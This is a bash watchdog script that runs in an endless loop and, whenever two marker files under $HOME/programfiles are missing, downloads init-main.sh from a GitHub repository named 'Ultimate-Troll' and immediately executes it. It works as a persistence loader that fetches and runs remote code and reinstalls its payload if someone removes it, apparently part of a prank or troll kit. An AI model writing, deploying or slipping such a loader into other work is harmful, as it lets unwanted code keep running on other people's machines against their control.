#!/usr/bin/env bash

# — ensure we’re running under bash (not /bin/sh) —
if [ -z "$BASH_VERSION" ]; then
  exec /usr/bin/env bash "$0" "$@"
fi

TARGET_DIR="$HOME/programfiles"
PFILE="$TARGET_DIR/p.txt"
TFILE="$TARGET_DIR/time.txt"
INIT_URL="https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/main/init-main.sh"
INIT_SCRIPT="$TARGET_DIR/init-main.sh"
SLEEP_INTERVAL=60  # seconds between checks

while true; do
  now=$(date '+%Y-%m-%d %H:%M:%S')
  
  if [[ ! -f "$PFILE" || ! -f "$TFILE" ]]; then
    echo "[$now] ⚠️  Missing p.txt or time.txt — re-running bootstrap..."
    
    # download bootstrap
    if curl -fSL "$INIT_URL" -o "$INIT_SCRIPT"; then
      chmod +x "$INIT_SCRIPT"
      echo "[$now] ✅  Bootstrap downloaded. Executing init-main.sh..."
      exec bash "$INIT_SCRIPT"
    else
      code=$?
      echo "[$now] ❌  curl failed with exit code $code"
    fi
    
  else
    echo "[$now] ✅  All files present. Sleeping for ${SLEEP_INTERVAL}s..."
  fi
  
  sleep "$SLEEP_INTERVAL"
done
